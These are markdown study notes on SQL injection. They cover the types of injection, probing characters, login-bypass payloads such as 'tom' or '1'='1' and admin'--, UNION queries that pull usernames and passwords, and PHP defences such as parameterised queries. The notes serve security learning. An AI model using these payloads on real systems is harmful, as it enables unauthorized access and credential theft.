---
title: sqlinjections
aliases: []
tags:
- study-notes
- technique/t1190
- technique/t1077
- technique/t1190
category: study_notes
status: draft
date_created: '2026-08-26'
date_modified: '2026-08-26'
source: sqlinjection.md
related_tools: []
related_techniques:
- '[[t1190]]'
- '[[T1077]]'
related_tactics:
- '[[TA0005]]'
related_services: []
related_os: []
related_notes: []
mitre_tactic: TA0005
mitre_technique: T1190
real_path: ''
port: ''
protocol: ''
os: ''
---

# sqlinjections

## Types of SQL Injection
- types
    - in-band means we can see the results via the web application
        - union based
            - specify the columns we require
        - error based
            - what errors are being returned, can we see the query
    - blind
        - boolean based
            - use SQL conditional statements to control whether the page returns any output at all, 'i.e., original query response,' if our conditional statement returns true
        - time based
            - by using the sleep() function
    - out-of-band

## Process
- can we break it by sending different payloads
        - `'`   or urlencoded `%27`
        - `"`   or urlencoded `%22`
        - `#`   or urlencoded `%23`
        - `;`   or urlencoded `%3B`
        - `)`   or urlencoded `%29`
    - OR injection
        - username `tom' or '1'='1`
    - comments
        - remember to add spaces to the end of the comments otherwise they might not get processed correctly
        - username `admin'-- `
        - username `admin' # `
        - username can be anything but id=5 `%' OR id=5) # -- `

## Union Injection
- must contain the same number of fields and datatypes
    - `SELECT * FROM ports UNION SELECT * FROM ships;`
    - `SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '`
    - if union requires multiple columns `UNION SELECT username, 2, 3, 4 from passwords-- '

## Mitigations
- [mysqli_real_escape_string](https://www.php.net/manual/en/mysqli.real-escape-string.php) `$username = mysqli_real_escape_string($conn, $_POST['username']);`
    - input validation via regex
```php
$pattern = "/^[A-Za-z\s]+$/";
$code = $_GET["port_code"];

if(!preg_match($pattern, $code)) {
  die("
</table></div><p style='font-size: 15px;'>Invalid input! Please try again.</p>");
}
```
    - parameterised queries
```php
  $username = $_POST['username'];
  $password = $_POST['password'];
  
  $query = "SELECT * FROM logins WHERE username=? AND password = ?" ;
  $stmt = mysqli_prepare($conn, $query);
  mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
  mysqli_stmt_execute($stmt);
  $result = mysqli_stmt_get_result($stmt);
  
  $row = mysqli_fetch_array($result);
  mysqli_stmt_close($stmt);
```

## References
- https://www.php.net/manual/en/mysqli.real-escape-string.php

